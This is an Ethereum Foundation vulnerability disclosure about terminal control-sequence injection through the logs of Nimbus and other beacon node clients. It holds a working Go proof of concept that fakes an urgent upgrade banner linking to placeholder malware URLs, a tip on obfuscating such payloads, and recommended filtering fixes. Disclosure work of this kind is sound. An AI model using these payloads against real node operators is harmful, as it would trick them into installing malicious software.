# [M] CL-2021-48: Control Sequence Injector

## Summary
Severity: Medium
Chain: Ethereum (consensus layer)
Component: Nimbus, Teku, Prysm, Lighthouse, Lodestar
Published: 2023-05-03
Source: https://notes.ethereum.org/Wg2pH0o3Q1-K2BMowW5vuA
Type: ef-disclosure

## Details
# Log Control Sequence Injection in multiple implementations of the Ethereum 2 beacon node
## Attack scenario
### More detailed description of the attack/bug scenario and unexpected/buggy behaviour
**This report only shows an exploit vector for Nimbus, but 4 more implementations have vulns. We need a way to attach files to send the rest of our PoCs**

An attacker can cause beacon nodes to log control sequences without filtering (Control Sequence Injection). The attacker can manipulate the logs in various ways due to the fact that the strings within log entries are executed by a terminal emulator. This also leads to code execution in some cases, but we will explain that in a future report.
## Impact
### Describe the effect this may have in a production setting
The attacker can put false information in the logs of eth2 beacon nodes. This includes giving a URL for an "update" to the program with malware, or giving malicious instructions. The textual user interface can be modified arbitrarily and there is no way for the user to know the instructions are fake. It's also possible to overwrite log entries nearby the attacker's log entries with things like \r (go back to start of line) and \x1b[NA (go up N lines).
## Components
### Point to the files, functions, and/or specific line numbers where the bug occurs
The logging mechanisms of Prysm, Teku, Lodestar, Lighthouse, and Nimbus.
## Reproduction
### If used any sort of tools/simulations to find the bug, describe in detail how to reproduce the buggy behaviour.
Here is the PoC for Nimbus. The 4 others are long and span multiple files so we will send them when you reply.

A banner will be shown in the Nimbus terminal saying that the user needs to upgrade at https://github.com/fake-nimbus/nimbus/releases/tag/v0.9.10 and its window title will be set to "!! URGENT NOTICE"
A floating banner will also appear on top the Nimbus terminal

Check out commit 8f815074a1afec53464dc569e7dc0cb3af4bec70 of Nimbus
Build it and run the node and view its logs in a terminal
Edit the `target` variable if needed in the following text, save it and run `go run <file>` Tested on Go 1.17

package main

import (
        "encoding/binary"
        "io"
        "net"
)

var target = "127.0.0.1:9000"

func main() {
        for run := 0; run < 2; run++ {
                var c net.Conn
                var err error
                c, err = net.Dial("tcp", target)
                if err != nil {
                        panic(err)
                }
                payload := ""
                if run == 0 {
                        payload = "\x1b[1G\x1b[0K\x1b[1A\x1b[1G\x1b[0K\x1b[1A\x1b[1G\x1b[0K\x1b[1G" +
                                "\x1b[31m╭────────────────────────────────────────────────────────────────╮\x1b[999G " +
                                "│\x1b[0m New \x1b[31mmajor\x1b[0m version of Nimbus available! \x1b[31mv0.9.9\x1b[0m →  \x1b[32mv0.9.10\x1b[0m       \x1b[31m│\x1b[999G " +
                                "│\x1b[0m You need to upgrade to the latest version to stay in consensus \x1b[31m│\x1b[999G " +
                                "│\x1b[0m \x1b[36mhttps://github.com/fake-nimbus/nimbus/releases/tag/v0.9.10\x1b[0m     \x1b[31m│\x1b[999G " +
                                "╰────────────────────────────────────────────────────────────────╯\x1b[0m\x1b]0;"
                } else {
                        payload = "\x1b];\u203c\ufe0f URGENT NOTICE\x07\x1b7\x1b[7;999r\x1b[33;45m" +
                                "\x1b[d\x1b[G\x1b[K" +
                                "\x1b[2d\x1b[G\x1b[K \x1b[1mURGENT!!\x1b[0m\x1b[33;45m A beacon in the blockchain has signalled that there" +
                                "\x1b[3d\x1b[G\x1b[K is a critical vulnerability being exploited in the wild!!" +
                                "\x1b[4d\x1b[G\x1b[K Get the patch \x1b[1mnow\x1b[0m\x1b[33;45m at https://fake-nimbus.team/update" +
                                "\x1b[5d\x1b[G\x1b[K Details at https://fake-nimbus.team/sec/NIMVT-9032" +
                                "\x1b[6d\x1b[G\x1b[K " +
                                "\x1b8\x1b]0;"
                }
                wr(c, []byte(payload))
        }
}

func wr(w io.Writer, data []byte) {
        if err := writeDelimited(w, data); err != nil {
                panic(err)
        }
}

func writeDelimited(w io.Writer, data []byte) error {
        buf := make([]byte, 8)
        n := binary.PutUvarint(buf, uint64(len(data)+1))
        _, err := w.Write(buf[:n])
        if err != nil {
                return err
        }

        _, err = w.Write(data)
        if err != nil {
                return err
        }

        _, err = w.Write([]byte{'\n'})

        return err
}




The Nimbus code responsible is this line in nimbus-eth2/vendor/nim-libp2p/libp2p/multistream.nim:
	    notice "handshake failed", conn, codec = s
## Fix
### Description of suggested fix, if available
There are more CSI (control sequence injection) vectors in your products. We recommend fixing all of them exhaustively.

We recommend passing all non-static output to the terminal through a filter that removes anything outside of 7 bit ASCII range minus control characters. i.e only allowing 0x20-0x7e inclusive. If that is not practical (for example you have a CLI that is used by people who use different scripts), then we recommend filtering all ASCII C0 control characters (0x00-0x1f), DEL (0x7f), and all C1 control characters. C1 control characters are 0x80-0x9f. However, with unicode they are codepoints instead of bytes (U+0080 - U+009F). That is, unicode terminals see a codepoint such as U+009B and parse it as if it was 0x9b in a pre-unicode terminal.
https://en.wikipedia.org/wiki/C0_and_C1_control_codes

In other words, any call to some sort of print function (in any language) should be changed like this:

-print("something something %s", somestring)
+print("something something %s", filter(somestring))

-log("something happened %s", somestring)
+log("something happened", filter(somestring))

Or better yet, have the log functions themselves do the filtering.

This should be **the default** way of outputting to the terminal. The only exception is if we absolutely know a given string cannot be influenced by an attacker.

- Avoid poor quality libraries and frameworks that output to the terminal or logs without your control
- Do not output debug strings or debug return values from libraries, or exceptions to the terminal
- Do not allow libraries to show stacktraces to the user
## Details
### Any details not covered above
This is part of a multilateral coordinated disclosure. We are taking time to show impactful exploit vectors for various software to illustrate that CSI is a real problem, but in general, everything's vulnerable, so we ask that this report is not disclosed until a few months on our signal when all vendors have been notified of the issue and have had time to patch. We also ask not to spread info about this vulnerability to more people than necessary, even within your team, until disclosure time.

Versions tested:

Nimbus:
commit 8f815074a1afec53464dc569e7dc0cb3af4bec70 (HEAD -> stable, origin/stable, origin/HEAD)

Teku:
commit 78f1e1ff40258482d3740f04ff0f623bdd31e4db (HEAD -> master, origin/master, origin/HEAD)

Prysm:
commit b128d446f2b97a6e6987c9e3503f3f1d7f9a6685 (HEAD -> develop, origin/develop, origin/HEAD)

Lighthouse:
commit 7c88f582d955537f7ffff9b2c879dcf5bf80ce13 (HEAD -> stable, tag: v2.0.0, origin/stable, origin/HEAD)

Lodestar:
commit 7bd7467b34f3b1bc6c541a901405b6711feb4205 (HEAD -> master, origin/master, origin/HEAD)

The CSI vector for Nimbus works out of the box. But the CSI vectors we found in Prysm, Teku, Lodestar, and Lighthouse require the user to set the log level to "debug" or higher verbosity.

The terminal emulator must be capable of executing control codes. The exploits to do not work on cmd.exe on Windows. But they should work on most other popular systems such as gnome-terminal on a Linux Distro, and Terminal.app on mac.

During a campaign making use of these exploits, log payloads can be obfuscated to delay detection/remediation.

For example:

$ echo $'\x1b[2Ge\x1b[1Gt\x1b[4Gt\x1b[3Gs'
test

Obfuscation can be endlessly improved with more advanced techniques.
